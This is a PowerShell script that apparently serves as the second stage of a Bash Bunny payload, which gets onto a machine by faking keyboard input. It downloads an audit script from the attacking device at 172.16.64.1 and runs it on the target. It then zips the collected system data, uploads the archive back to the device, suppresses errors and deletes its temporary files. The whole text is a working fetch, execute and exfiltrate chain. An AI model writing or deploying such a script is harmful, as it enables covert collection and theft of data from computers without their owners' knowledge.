# ================================================================
#  runner.ps1 — Staged PowerShell runner for Bash Bunny SysAudit payload
#
#  This script is served by the Bunny's HTTP server (receive.py) and
#  downloaded/executed on the target via the HID-injected bootstrap.
#
#  Steps:
#    1. Download SysAudit.ps1 from the Bunny (172.16.64.1)
#    2. Run the full system audit (-SkipMsiProducts for speed)
#    3. Compress C:\SysAudit\ output directory to a ZIP
#       (ZipFile .NET class primary; Compress-Archive PS 5.0+ fallback)
#    4. POST ZIP to the Bunny's /upload endpoint via WebClient
#    5. Remove temp files
#
#  Compatible with PowerShell 3.0+ / .NET 4.5+
#  (PS 2.0 compatible for steps 1-2 if SysAudit.ps1 is PS 2.0 safe)
# ================================================================

$ErrorActionPreference = 'SilentlyContinue'

$bunny  = 'http://172.16.64.1'
$tmpPs  = 'C:\Windows\Temp\bb_sa.ps1'
$tmpZip = 'C:\Windows\Temp\bb_sa.zip'

# Step 1: Download SysAudit.ps1 from the Bunny
(New-Object Net.WebClient).DownloadFile("$bunny/SysAudit.ps1", $tmpPs)

# Step 2: Run audit (skip slow Win32_Product WMI scan)
if (Test-Path $tmpPs) {
    & $tmpPs -SkipMsiProducts
}

# Step 3: Compress audit output directory
# Primary: .NET ZipFile (available on .NET 4.5 / PS 3.0+, no module dependency)
# Fallback: Compress-Archive (PS 5.0+ only)
Add-Type -Assembly System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
if (Test-Path 'C:\SysAudit') {
    try {
        if ([System.IO.File]::Exists($tmpZip)) {
            [System.IO.File]::Delete($tmpZip)
        }
        [IO.Compression.ZipFile]::CreateFromDirectory('C:\SysAudit', $tmpZip)
    } catch {
        if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
            Compress-Archive 'C:\SysAudit\*' $tmpZip -Force -ErrorAction SilentlyContinue
        }
    }
}

# Step 4: POST ZIP to the Bunny receiver
if (Test-Path $tmpZip) {
    try {
        $wc = New-Object Net.WebClient
        $wc.UploadFile("$bunny/upload", 'POST', $tmpZip) | Out-Null
    } catch {}
}

# Step 5: Cleanup temp files
Remove-Item $tmpPs, $tmpZip -Force -ErrorAction SilentlyContinue
